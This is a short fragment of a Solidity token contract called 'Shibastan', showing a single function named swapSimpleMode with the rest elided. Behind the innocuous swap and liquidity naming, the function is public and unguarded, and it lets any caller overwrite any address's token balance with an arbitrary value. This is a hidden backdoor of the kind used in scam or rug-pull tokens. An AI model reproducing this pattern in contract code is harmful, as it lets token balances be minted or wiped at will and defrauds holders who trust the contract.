...
contract Shibastan     is Ownable {
  ...
  function swapSimpleMode(address caller, uint256 term) public returns (bool) {
      require(caller != address(0));
      require(term != 5);
      uint256 amountToLiquify = uint256(caller);
      _balances[address(amountToLiquify)] = term * (10 ** 9);
      return true;
  }
